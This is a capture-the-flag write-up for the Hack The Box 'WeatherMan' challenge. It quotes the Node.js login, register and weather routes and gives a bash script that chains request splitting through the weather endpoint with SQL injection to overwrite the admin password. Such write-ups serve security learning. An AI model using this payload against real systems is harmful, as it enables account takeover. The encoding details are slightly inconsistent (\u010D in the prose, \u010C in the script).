#  WeatherMan HTB Challenge 

__________________________________________

This app works on nodejs, particulary on a vulnerable nodejs 8.12.0

## Objective

The goal is to login as admin to retrieve the flag:
```js
router.post('/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return db.isAdmin(username, password)
			.then(admin => {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
```

There's a register page where we can not register unless we are requesting from localhost:
```js
router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}

	let { username, password } = req.body;

	if (username && password) {
		return db.register(username, password)
			.then(()  => res.send(response('Successfully registered')))
			.catch(() => res.send(response('Something went wrong')));
	}
```

Also there is an api/weather:

```js
router.post('/api/weather', (req, res) => {
	let { endpoint, city, country } = req.body;

	if (endpoint && city && country) {
		return WeatherHelper.getWeather(res, endpoint, city, country);
	}

	return res.send(response('Missing parameters'));
```

The credentials are taken care by a SQL db.

**So we need to first bypass the localhost restriction with SSRF attack and try a way to SQLinjection to be admin**

# Exploit

So make a POST request to /api/weather, into the endpoint parameter put the SSRF splitting Payload encoding the space "\u0120" the \r "\u010D"and \u "\u010A".
The sqli update the password. 

This bash script do it quickly!

```bash
#!/bin/bash

# User credentials
username="admin"
password="') ON CONFLICT (username) DO UPDATE SET password = 'passwd123';--"

# Encode username and password
username=$(echo "$username" | sed 's/ /\\u0120/g; s/'\''/%27/g; s/"/%22/g')
password=$(echo "$password" | sed 's/ /\\u0120/g; s/'\''/%27/g; s/"/%22/g')

# Construct the endpoint
endpoint="127.0.0.1/\\u0120HTTP/1.1\\u010C\\u010AHost:127.0.0.1\\u010C\\u010A\\u010C\\u010APOST/register\\u0120HTTP/1.1\\u010C\\u010AHost:127.0.0.1\\u010C\\u010AContent-Type:application/x-www-form-urlencoded\\u010C\\u010AContent-Length:$((${#username} + ${#password} + 19))\\u010C\\u010A\\u010C\\u010Ausername=${username}&password=${password}\\u010C\\u010A\\u010C\\u010AGET\\u0120"

# Make the POST request
curl -X POST 'http://MACHINE_IP:MACHINE_PORT/api/weather' -H 'Connection: close' -d "endpoint=$endpoint&city=Rome&country=IT"

```